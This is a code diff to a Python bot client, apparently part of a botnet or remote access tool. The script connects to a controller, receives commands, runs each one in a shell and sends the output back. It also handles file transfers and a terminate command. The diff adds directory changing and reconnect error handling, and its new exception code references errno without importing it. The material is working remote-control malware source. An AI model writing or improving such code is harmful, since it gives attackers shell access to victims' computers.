@@ -1,6 +1,6 @@
 #! /usr/bin/env python3
 
-import modules, urllib.request, time, socket, subprocess
+import modules, urllib.request, time, socket, subprocess, os
 
 
 botname = ''			# Put name of bot here
@@ -26,8 +26,12 @@ def connect():
 		command = s.recv(1024).decode()
 
 		if '==terminate' in command:
-			s.close()
-			s.send('closed')
+			try:
+				s.close()
+			except ConnectionResetError as e:
+				if e.errno != errno.ECONNRESET:
+					raise # Not error we are looking for
+				pass # Handle error here.
 			break
 		elif '==transfer' in command: # we use 'in' here since there will be more arguments.
 			cmd,path = command.split('*')
@@ -37,10 +41,16 @@ def connect():
 			except Exception as e:
 				s.send ( str(e) ) # send the exception error
 				pass
+		elif command.split(' ')[0] == 'cd':
+			os.chdir(
+				command.split(' ')[1]
+			)
 		else:
 			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			s.send( CMD.stdout.read() ) 
 			s.send( CMD.stderr.read() )
+
+	return
 # ======================================================== #
 
 while True: # Tests for instruction every 10 seconds.
@@ -50,4 +60,7 @@ while True: # Tests for instruction every 10 seconds.
 		time.sleep(10)
 		continue
 	elif ( ACTIVE == True ) or ( ACTIVE == 'manual' ):
-		connect()
+		try:
+			connect()
+		except ConnectionError as e:
+			pass
